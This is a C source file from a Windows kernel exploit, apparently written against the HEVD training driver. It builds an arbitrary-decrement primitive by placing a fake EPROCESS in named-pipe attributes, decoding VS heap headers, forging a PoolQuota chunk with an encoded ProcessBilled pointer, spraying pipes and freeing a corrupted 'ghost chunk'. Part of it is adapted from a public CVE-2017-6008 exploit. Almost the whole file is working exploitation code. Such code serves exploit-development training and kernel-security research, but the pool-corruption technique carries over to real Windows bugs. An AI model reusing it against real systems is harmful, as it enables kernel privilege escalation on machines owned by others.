#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <cstdint>

#include "primitives/arbitrary_decrement.h"

#include "primitives/fake_chunk.h"
#include "primitives/arbitrary_read.h"
#include "pipe_utils/pipe_utils.h"
#include "hevd/hevd.h"

uintptr_t allocFakeEprocess(pipe_pair_t* ghost_pipe, exploit_addresses_t* addrs, char* fake_eprocess_buf)
{
    uintptr_t fake_eprocess_attribute;
    // The pipe queue entry list is corrupted, use the pipe attribute to store arbitrary data in the kernel
    SetPipeAttribute(ghost_pipe, fake_eprocess_buf, DUMB_ATTRIBUTE_NAME_LEN + (FAKE_EPROCESS_SIZE * 2));

    // We can read prev or next of the root to find the attribute that contains the arbitrary data
    ArbitraryRead(ghost_pipe, addrs->leak_root_attribute + 0x8, (char*)&fake_eprocess_attribute, 0x8);
    printf("[+] fake_eprocess_attribute: 0x%llx\n", fake_eprocess_attribute);

    // The data of the fake EPROCESS is at fake_eprocess_attribute->AttributeValue
    uintptr_t fake_eprocess;
    ArbitraryRead(ghost_pipe, fake_eprocess_attribute + 0x20, (char*)&fake_eprocess, 0x8);
    return fake_eprocess;
}

int setupFakeEprocessAttribute(char* fake_eprocess_attribute, uintptr_t addr_to_decrement)
{
    char fake_eprocess_buf[0x1000] = { 0 };

    // Set attribute name
    strcpy_s(fake_eprocess_attribute, DUMB_ATTRIBUTE_NAME_LEN, DUMB_ATTRIBUTE_NAME);

    /* initFakeEprocess
    from: https://github.com/cbayet/Exploit-CVE-2017-6008/blob/95ee99c7/Win10/src/CVE-2017-6008_Win10_Exploit.cpp#L205-L232*/
    memset((PVOID)fake_eprocess_buf, 0x41, FAKE_EPROCESS_SIZE);

    PVOID addr = (PVOID)((DWORD64)fake_eprocess_buf + FAKE_EPROCESS_OFFSET);

    memset((char*)addr - 0x40, 0xA, 0x40);
    memset((char*)addr - 0x18, 0xB, 0x1);

    memset(addr, 0x3, 1);

    // Set address to decrement in fake structure
    memcpy((char*)addr + EPROCESS_QUOTA_BLOCK_OFFSET, &addr_to_decrement, sizeof(DWORD64));
    /* end of initFakeEprocess */

    // Copy prepared fake EPROCESS to attribute buffer
    memcpy(fake_eprocess_attribute + DUMB_ATTRIBUTE_NAME_LEN, fake_eprocess_buf, FAKE_EPROCESS_SIZE);

    return 1;
}

int SetupArbitraryDecrement(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
{
    ArbitraryRead(pipes->ghost_pipe, addrs->kernel_base + nt_RtlpHpHeapGlobals_OFFSET, (char*)&addrs->RtlpHpHeapGlobals, 0x8);
    printf("[+] RtlpHpHeapGlobals: 0x%llx\n", addrs->RtlpHpHeapGlobals);

    puts("[*] Searching for allocated VS header to locate subsegment...");
    size_t vs_header_addr = addrs->ghost_chunk - POOL_HEADER_SIZE + NEXT_CHUNK_OFFSET;
    addrs->vs_sub_segment = 0;
    do
    {
        uint64_t encoded_vs_header[2];
        HEAP_VS_CHUNK_HEADER* vs_header = (HEAP_VS_CHUNK_HEADER*)&encoded_vs_header;

        ArbitraryRead(pipes->ghost_pipe, vs_header_addr, (char*)&encoded_vs_header, sizeof(uint64_t));
        ArbitraryRead(pipes->ghost_pipe, vs_header_addr + 8, (char*)(&encoded_vs_header) + 8, sizeof(uint64_t));

        encoded_vs_header[0] = encoded_vs_header[0] ^ vs_header_addr ^ addrs->RtlpHpHeapGlobals;
        encoded_vs_header[1] = encoded_vs_header[1] ^ vs_header_addr ^ addrs->RtlpHpHeapGlobals;

        printf("[*] vs_header_addr: 0x%llX\n\theader->Allocated: 0x%x\n\theader->UnsafePrevSize: 0x%x\n\theader->UnsafeSize: 0x%x\n\theader->EncodedSegmentPageOffset: 0x%x\n",
            vs_header_addr, vs_header->Allocated, vs_header->UnsafePrevSize, vs_header->UnsafeSize, vs_header->EncodedSegmentPageOffset);

        if (vs_header->Allocated)
        {
            addrs->vs_sub_segment = vs_header_addr - (vs_header->EncodedSegmentPageOffset << 12) & ~0xfffll;
            printf("[+] vs_sub_segment: 0x%llX\n", addrs->vs_sub_segment);
        }

        vs_header_addr += vs_header->UnsafeSize * 0x10;
    } while (!addrs->vs_sub_segment);

    return 1;
}

int ArbitraryDecrement(exploit_pipes_t* pipes, exploit_addresses_t* addrs, uintptr_t addr_to_decrement)
{
    // Prepare fake EPROCESS attribute
    char fake_eprocess_attribute[0x1000] = { 0 };
    setupFakeEprocessAttribute(fake_eprocess_attribute, addr_to_decrement - 0x1);

    // Allocate and locate fake EPROCESS
    addrs->fake_eprocess = allocFakeEprocess(pipes->ghost_pipe, addrs, fake_eprocess_attribute);
    printf("[+] Fake EPROCESS address: 0x%llX\n", addrs->fake_eprocess);

    puts("[*] Setting up _HEAP_VS_CHUNK_HEADER");
    size_t ghost_chunk_vs_header = addrs->ghost_chunk - POOL_HEADER_SIZE;
    uint64_t new_encoded_vs_header[2] = { 0 };
    HEAP_VS_CHUNK_HEADER* new_vs_header = (HEAP_VS_CHUNK_HEADER*)&new_encoded_vs_header;
    new_vs_header->Allocated = 0x1;
    new_vs_header->UnsafePrevSize = PREV_CHUNK_OFFSET / 0x10;
    new_vs_header->UnsafeSize = NEXT_CHUNK_OFFSET / 0x10;
    new_vs_header->EncodedSegmentPageOffset = (ghost_chunk_vs_header - addrs->vs_sub_segment) >> 12 & 0xff;
    new_encoded_vs_header[0] = new_encoded_vs_header[0] ^ ghost_chunk_vs_header ^ addrs->RtlpHpHeapGlobals;
    new_encoded_vs_header[1] = new_encoded_vs_header[1] ^ ghost_chunk_vs_header ^ addrs->RtlpHpHeapGlobals;

    pipe_queue_entry_t overwritten_pipe_entry;
    overwritten_pipe_entry.list.Flink = (LIST_ENTRY*)addrs->leak_root_queue;
    overwritten_pipe_entry.list.Blink = (LIST_ENTRY*)addrs->leak_root_queue;
    overwritten_pipe_entry.linkedIRP = 0;
    overwritten_pipe_entry.SecurityClientContext = 0;
    overwritten_pipe_entry.isDataInKernel = 0;
    overwritten_pipe_entry.DataSize = 0;
    overwritten_pipe_entry.remaining_bytes = 0;
    overwritten_pipe_entry.field_2C = 0x43434343;

    char* fake_pool_quota_chunk_buf = CreateFakeChunk(
        new_encoded_vs_header,
        0,                                                                                              // Previous size
        0,                                                                                              // Pool index
        0x100 / 0x10,                                                                                   // Block size (0x100 bytes)
        8,                                                                                              // Pool type (PoolQuota)
        0x42424242,                                                                                     // Pool Tag
        (addrs->fake_eprocess + FAKE_EPROCESS_OFFSET) ^ addrs->ExpPoolQuotaCookie ^ addrs->ghost_chunk, // ProcessBilled
        &overwritten_pipe_entry                                                                         // PipeQueueEntry
    );

    puts("[*] Spraying pipes with fake ProcessBilled...");
    uintptr_t pipe_queue_entry_addr = NULL;
    do
    {
        FreeNPPNxChunk(pipes->previous_pipe, TARGETED_VULN_SIZE - 0x40);
        AllocNPPNxChunk(pipes->previous_pipe, fake_pool_quota_chunk_buf, TARGETED_VULN_SIZE - 0x40);
        ArbitraryRead(pipes->ghost_pipe, addrs->leak_root_queue, (char*)&pipe_queue_entry_addr, 0x8);
    } while (pipe_queue_entry_addr == addrs->ghost_chunk + POOL_HEADER_SIZE);

    puts("[*] Freeing ghost chunk to trigger arbitrary decrement");
    FreeNPPNxChunk(pipes->ghost_pipe, GHOST_CHUNK_BUFSIZE);

    return 1;
}
